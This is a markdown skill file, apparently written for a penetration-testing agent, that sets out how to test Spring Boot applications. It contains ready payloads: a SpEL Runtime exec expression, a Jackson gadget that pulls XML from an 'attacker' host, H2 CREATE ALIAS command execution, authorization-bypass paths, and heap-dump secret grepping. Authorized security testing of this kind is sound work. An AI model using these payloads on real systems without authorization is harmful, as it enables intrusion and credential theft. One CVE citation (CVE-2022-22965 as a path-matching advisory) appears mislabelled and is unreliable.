---
name: springboot
description: Spring Boot/Java security testing covering Actuator exposure, SpEL injection, security-matcher bypass, and Jackson deserialization gadgets
---

# Spring Boot

Spring Boot's two signature bug classes are almost mechanical to check: an exposed Actuator endpoint dumping environment secrets or heap memory, and a Spring Security matcher pattern that doesn't line up with the actual `@RequestMapping` path — silently letting an unauthenticated request through a filter that thinks it's blocking it. Check both before anything deeper.

## Attack Surface

**Core components**
- Spring MVC (`@RestController`/`@Controller`, `@RequestMapping` family), Spring Security filter chain
- Spring Boot Actuator (`/actuator/*`) — health, env, metrics, heapdump, mappings, beans, jolokia
- Spring Expression Language (SpEL) in `@Value`, Spring Cloud Gateway/Function routing rules
- Jackson (JSON (de)serialization), Hibernate/JPA, Spring Data REST

**Config surface**
- `application.properties`/`application.yml`, `@ConfigurationProperties` classes bound from env/external config
- Spring profiles (`dev`/`prod`) — dev profile accidentally active in production relaxes security

## Reconnaissance

**Actuator discovery**
```
GET /actuator
GET /actuator/health
GET /actuator/env
GET /actuator/beans
GET /actuator/mappings
GET /actuator/heapdump
GET /actuator/threaddump
GET /actuator/jolokia/list
```
Older Spring Boot (1.x) exposes these at the root (`/env`, `/beans`, `/heapdump`) instead of `/actuator/*` — check both. `/actuator` (root) lists every exposed endpoint on the running instance if enumeration is enabled.

**Version fingerprint**
- `Server`/`X-Application-Context` headers, error-page stack trace class names (`org.springframework.boot.autoconfigure.*`), `/actuator/info` (if exposed) frequently includes `build.version`.

## Key Vulnerabilities

### Actuator endpoint exposure

- **`/actuator/env`** — dumps every property source including datasource passwords, JWT signing secrets, cloud credentials (`AWS_SECRET_ACCESS_KEY`), and any secret pulled from env vars/config server. This alone is usually a critical finding.
- **`/actuator/heapdump`** — full JVM heap dump downloadable; grep for credentials, session tokens, and PII with `strings heapdump | grep -iE 'password|token|secret'` or a proper heap analyzer (Eclipse MAT).
- **`/actuator/jolokia`** (if present, JMX-over-HTTP) — `jolokia` write access to MBeans is a well-known RCE primitive: write to `MLet` MBean to load a remote MBean from an attacker-controlled URL, or abuse `Tomcat`'s `MBean` to deploy a WAR through JMX.
  ```
  POST /actuator/jolokia
  {"type":"EXEC","mbean":"com.sun.management:type=DiagnosticCommand","operation":"...","arguments":[...]}
  ```
- **`/actuator/mappings`** — full route map, including internal-only endpoints not linked anywhere in the frontend; correlate with the Security matcher issue below.
- Legacy `/actuator/shutdown` (POST, unauthenticated on some old configs) — trivial DoS by shutting the instance down.

### SpEL injection

Spring Expression Language is evaluated wherever an app passes user input into `SpelExpressionParser().parseExpression(userInput)` — common in custom `@PreAuthorize`/`@PostAuthorize` annotations built from dynamic strings, or Spring Cloud Function/Gateway routing rules that accept a SpEL-based predicate.
```
${T(java.lang.Runtime).getRuntime().exec('id')}
```
Spring Cloud Function's routing-expression header injection (`spring.cloud.function.routing-expression`) is a well-documented unauthenticated RCE pattern (CVE-2022-22963-class) — check any Spring Cloud Function/Gateway deployment for header-driven SpEL evaluation.

### Spring Security matcher/mapping mismatch

The classic pattern: a `WebSecurityConfigurerAdapter`/`SecurityFilterChain` rule matches `/admin/**` using `AntPathRequestMatcher`, while the actual controller is annotated `@RequestMapping("/admin/")` — differences in trailing slash, case sensitivity, path-parameter matching (`;jsessionid=`, `//`, URL-encoded path segments) between the security matcher's pattern engine and Spring MVC's `PathPattern`/`AntPathMatcher` let a crafted path satisfy the controller's routing while failing to match the security rule.
```
GET /admin/../admin/dashboard
GET /admin%2f..%2fadmin/dashboard
GET /ADMIN/dashboard   (if matcher is case-sensitive but MVC routing isn't)
```
This is version-dependent (Spring Security historically defaulted `AntPathMatcher` while MVC moved to `PathPatternParser` — mismatches between the two engines were CVE-worthy, e.g. CVE-2022-22965/related path-matching advisories) — always confirm against the specific deployed version rather than assuming.

### Jackson polymorphic deserialization

`ObjectMapper` configured with `enableDefaultTyping()` or an `@JsonTypeInfo` annotation accepting attacker-controlled `@class` fields is a gadget-chain target, structurally identical to Java's classic deserialization bug class but reachable via plain JSON.
```json
{"@class":"org.springframework.context.support.ClassPathXmlApplicationContext","constructorArgs":["http://attacker/evil.xml"]}
```
Check any endpoint accepting `Object`-typed fields or generic `Map<String,Object>` bodies where Jackson's default typing is enabled — `ysoserial`-style gadget catalogs apply (ROME, Groovy, Spring-specific chains).

### H2 console exposure

Spring Boot dev convenience `/h2-console` left enabled in a non-dev profile grants a full SQL console against the app's database — and H2's `CREATE ALIAS` feature lets you register a Java static method as a SQL function, i.e. direct RCE from the console:
```sql
CREATE ALIAS EXEC AS 'String exec(String cmd) throws Exception {
  return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
}';
CALL EXEC('id');
```

## Testing Methodology

1. **Actuator sweep** — enumerate `/actuator` and `/actuator/*` (both modern and legacy 1.x paths), prioritize `env`, `heapdump`, `jolokia`, `mappings`.
2. **Mappings cross-check** — diff `/actuator/mappings` output against what the Security config appears to protect; probe path-normalization tricks on any endpoint that looks admin-only but isn't obviously reachable.
3. **SpEL surface** — any custom `@PreAuthorize`/dynamic-expression annotation, Spring Cloud Function routing headers.
4. **Jackson typing check** — send a `@class`-annotated payload to any JSON endpoint accepting loosely-typed bodies; watch for a deserialization error that confirms the type was processed (even before achieving a full gadget chain) vs a clean type-mismatch rejection.
5. **H2 console check** — `/h2-console` reachability outside dev profile.

## Validation

1. Actuator: show the actual secret/credential recovered from `/actuator/env` or `/actuator/heapdump`, not just endpoint reachability.
2. Path-matcher bypass: side-by-side request showing the crafted path reaching the protected controller while the "canonical" path is correctly blocked.
3. SpEL/Jackson RCE: command execution output or out-of-band callback with the exact payload and vulnerable sink (annotation, header, or JSON field).
4. H2 console RCE: `CREATE ALIAS`/`CALL` output proving command execution, not just console reachability.

## False Positives

- Actuator endpoints exposed but return only non-sensitive health/uptime data — confirm `env`/`heapdump`/`jolokia` specifically before treating exposure as high severity.
- Security matcher and MVC routing use the same `PathPatternParser` in newer Spring Boot (3.x defaults) — the matcher/mapping mismatch class largely doesn't apply; confirm the actual matching engine in use.
- Jackson `ObjectMapper` explicitly disables default typing and validates `@class` against an allowlist — deserialization attempts correctly rejected.

## Impact

- Full credential/secret disclosure via Actuator `env`/`heapdump`.
- Unauthenticated RCE via Jolokia MBean write, SpEL injection, or H2 console `CREATE ALIAS`.
- Authorization bypass on admin-only routes via Security-matcher/MVC-routing path mismatch.
- Deserialization RCE via Jackson polymorphic typing gadget chains.

## Pro Tips

1. `/actuator/env` is the single highest-yield first request against any Spring Boot target — check it before anything else.
2. Confirm the Spring Boot major version early (1.x uses root-level endpoints, 2.x+ uses `/actuator/*`) — testing the wrong path set wastes requests.
3. Path-matcher bypass findings need the specific Spring Security/Boot version cited — this bug class was actively patched across versions, don't assume it applies.
4. Pair with `insecure_deserialization` for the general Jackson/Java gadget-chain methodology.

## Summary

Spring Boot's attack surface is dominated by operational convenience features left enabled in production: Actuator (secrets, heap, JMX-over-HTTP), the H2 console, and permissive Jackson typing. The one true logic bug worth hunting is a Security-matcher pattern that disagrees with Spring MVC's own routing engine — when it exists, it's a clean authorization bypass on whatever "protected" route it covers.
